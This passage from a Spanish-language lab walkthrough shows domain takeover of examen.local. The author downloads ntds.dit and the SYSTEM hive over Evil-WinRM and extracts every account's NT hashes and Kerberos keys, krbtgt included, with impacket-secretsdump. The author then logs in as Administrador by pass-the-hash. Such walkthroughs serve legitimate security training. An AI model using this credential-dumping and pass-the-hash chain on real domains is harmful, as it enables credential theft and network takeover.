  0.3%
  0.6%
  0.9%
  1.2%
  1.5%
  2.1%
  2.5%
  2.8%
  3.7%
 ...
 97.1%
 97.5%
 97.8%
 98.1%
 98.4%
 98.7%
 99.3%
 99.6%
100%

------------------------------------------------------------------------------

               Total   Copiado   OmitidoNo coincidencia     ERROR    Extras
Director.:         1         0         1         0         0         0
 Archivos:         1         1         0         0         0         0
    Bytes:   20.00 m   20.00 m         0         0         0         0
   Tiempo:   0:00:00   0:00:00                       0:00:00   0:00:00


Velocidad:            31968780 Bytes/s
Velocidad:            1829.268 Megabytes/min
```

Descarago los archivos y uso **impacket-secretsdump** para extraer los hashes de las contraseñas de los usuarios del **AD**.

```java
*Evil-WinRM* PS C:\Temp>  ls


    Directorio: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/27/2024  12:01 AM       20971520 ntds.dit
-a----        10/1/2024   9:12 PM             94 script.txt
-a----        10/1/2024   9:36 PM       14172160 system


*Evil-WinRM* PS C:\Temp> download C:\Temp\ntds.dit 
                                        
Info: Downloading C:\Temp\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download C:\Temp\system
                                        
Info: Downloading C:\Temp\system to system
                                        
Info: Download successful!
```

```ruby
❯ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf05e6d81ae05cf23a38097c61aa40623
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 19b3eaf7d892e6bde05f7b07044c9ab7
[*] Reading and decrypting hashes from ntds.dit 
Administrador:500:aad3b435b51404eeaad3b435b51404ee:cfae279a292213ad9968334a452e6b8a:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-442P9GU13EM$:1000:aad3b435b51404eeaad3b435b51404ee:f27860c9b7d343e438c257c695a20a5b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36126cbde83ad22c9bb2ad1f0e3176ce:::
examen.local\ifp_asrep:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
examen.local\SVC_SQL:1104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
examen.local\guille:1105:aad3b435b51404eeaad3b435b51404ee:6868d48bb415b5851c19ff4c51e78f45:::
examen.local\vuln:1106:aad3b435b51404eeaad3b435b51404ee:6868d48bb415b5851c19ff4c51e78f45:::
examen.local\admin:1107:aad3b435b51404eeaad3b435b51404ee:6868d48bb415b5851c19ff4c51e78f45:::
examen.local\user1:1108:aad3b435b51404eeaad3b435b51404ee:6868d48bb415b5851c19ff4c51e78f45:::
examen.local\julian:1109:aad3b435b51404eeaad3b435b51404ee:6868d48bb415b5851c19ff4c51e78f45:::
[*] Kerberos keys from ntds.dit 
WIN-442P9GU13EM$:aes256-cts-hmac-sha1-96:ca656415ecaf27c189c98283901ad5ba60952193f904f32347544ee29785f107
WIN-442P9GU13EM$:aes128-cts-hmac-sha1-96:37037166c6014669b98d058ca77796c6
WIN-442P9GU13EM$:des-cbc-md5:57079d79ad374ae3
krbtgt:aes256-cts-hmac-sha1-96:d22b69230cceb27c6ed02f4beabab586b676b00d36c87ef885e5fa86cf144d82
krbtgt:aes128-cts-hmac-sha1-96:6c1d7dbfd10f7886d6860393bc679373
krbtgt:des-cbc-md5:c449cba74fdc1626
examen.local\ifp_asrep:aes256-cts-hmac-sha1-96:6a0d5361d3ad7709636da611cb7743121e52bba9d56449d669a74e6e12727889
examen.local\ifp_asrep:aes128-cts-hmac-sha1-96:b36cc7407bee9bde01e50de2abf5f462
examen.local\ifp_asrep:des-cbc-md5:ea5e915d6404daa7
examen.local\SVC_SQL:aes256-cts-hmac-sha1-96:86adcad13ffac44aa6e8190c43b08d28b62a22836c6f680079e8dc792c525756
examen.local\SVC_SQL:aes128-cts-hmac-sha1-96:285747b7f3a123050b01a743abe94cf0
examen.local\SVC_SQL:des-cbc-md5:374f45070be02a8a
examen.local\guille:aes256-cts-hmac-sha1-96:5bbdb34d10286d4d3c9fe58adaaa265a138122c9783e97a20549c11bc8384ed0
examen.local\guille:aes128-cts-hmac-sha1-96:9569f140d0f33c34ff158c1b6e7335d8
examen.local\guille:des-cbc-md5:70fdd6b683b698a7
examen.local\vuln:aes256-cts-hmac-sha1-96:4a98348ba382049dd7d46438d1edf2d72cbb7a94d150f7794e1ecc75276afb6c
examen.local\vuln:aes128-cts-hmac-sha1-96:99fcef5f64ee92a8811c1845b8eed0f6
examen.local\vuln:des-cbc-md5:1925e013ec927a94
examen.local\admin:aes256-cts-hmac-sha1-96:2d1769d008b08018fa6d9ba3391668619e965eff1ada3fca6f57922c13440bc5
examen.local\admin:aes128-cts-hmac-sha1-96:33288f3fe494b5a5695cb138d0ca4146
examen.local\admin:des-cbc-md5:7c8f8031a7fd1c7c
examen.local\user1:aes256-cts-hmac-sha1-96:477f33e7740f2557c3b10c37c5eeb12f03e642467d8481fecabc4e8526f7226f
examen.local\user1:aes128-cts-hmac-sha1-96:27ce586cbde73ccf6121db5a50ec3018
examen.local\user1:des-cbc-md5:ef9bfdd50125d061
examen.local\julian:aes256-cts-hmac-sha1-96:5ab6e3dc7107846f379f89b81584d02a6031b7ffb82455ad4c51e4f31e1c3596
examen.local\julian:aes128-cts-hmac-sha1-96:b650419b25cb1f1b535cc555bde3a376
examen.local\julian:des-cbc-md5:b08ca20be6dc383e
[*] Cleaning up... 
```

Con el hash del usuario **Administrador** uso _evil-winrm_ para hacer un **Pass-The-Hash** y acceder con privilegios de admin.

```ruby
❯ evil-winrm -i 192.168.1.19 -u 'Administrador' -H 'cfae279a292213ad9968334a452e6b8a'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador> whoami
examen\administrador
*Evil-WinRM* PS C:\Users\Administrador> 

```
